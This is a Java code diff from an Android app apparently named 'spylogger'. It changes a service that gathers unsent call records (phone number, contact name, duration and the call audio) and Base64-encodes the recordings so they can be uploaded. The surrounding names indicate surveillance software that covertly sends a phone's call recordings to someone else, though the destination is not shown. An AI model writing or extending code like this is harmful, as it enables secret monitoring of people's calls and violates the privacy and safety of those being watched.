@@ -8,6 +8,7 @@ import com.gravatasufoca.spylogger.helpers.TaskComplete;
 import com.gravatasufoca.spylogger.model.Ligacao;
 import com.gravatasufoca.spylogger.model.TipoMensagem;
 import com.gravatasufoca.spylogger.model.Topico;
+import com.gravatasufoca.spylogger.utils.Utils;
 import com.gravatasufoca.spylogger.vos.ContatoVO;
 import com.gravatasufoca.spylogger.vos.RespostaRecebimentoVO;
 import com.j256.ormlite.dao.Dao;
@@ -102,8 +103,8 @@ public class SendGravacoesService extends SendDataService<RespostaRecebimentoVO>
         try {
             Dao<Ligacao, Integer> daoMensagem = dbHelper.getDao(Ligacao.class);
 
-            raws = daoMensagem.queryRaw("select id,data,audio,numero,remetente,duracao,nome,topico_id from ligacao where enviado=0",
-                    new DataType[]{DataType.INTEGER,DataType.DATE_LONG,DataType.STRING,DataType.STRING,DataType.BOOLEAN_INTEGER,DataType.LONG,DataType.STRING,DataType.INTEGER});
+            raws = daoMensagem.queryRaw("select id,data,arquivo,numero,remetente,duracao,nome,topico_id from ligacao where enviado=0",
+                    new DataType[]{DataType.INTEGER,DataType.DATE_LONG,DataType.BYTE_ARRAY,DataType.STRING,DataType.BOOLEAN_INTEGER,DataType.LONG,DataType.STRING,DataType.INTEGER});
             List<Ligacao> ligacoes = new ArrayList<>();
             int contador = 0;
             Iterator<Object[]> iterator = raws.iterator();
@@ -115,13 +116,15 @@ public class SendGravacoesService extends SendDataService<RespostaRecebimentoVO>
                     Ligacao ligacao=new Ligacao();
                     ligacao.setId((Integer) resultRaw[0]);
                     ligacao.setData((Date) resultRaw[1]);
-                    ligacao.setAudio((String) resultRaw[2]);
+                    ligacao.setArquivo((byte[]) resultRaw[2]);
                     ligacao.setNumero((String) resultRaw[3]);
                     ligacao.setRemetente((Boolean) resultRaw[4]);
                     ligacao.setDuracao((Long) resultRaw[5]);
                     ligacao.setNome((String) resultRaw[6]);
                     ligacao.setTopico(new Topico.TopicoBuilder().setId((Integer) resultRaw[7]).build(TipoMensagem.AUDIO));
 
+                    ligacao.setAudio(Utils.encodeBase64(ligacao.getArquivo()));
+                    ligacao.setArquivo(null);
                     ligacoes.add(ligacao);
                 } catch (Exception e) {
                     Log.e("spylogger",e.getMessage());
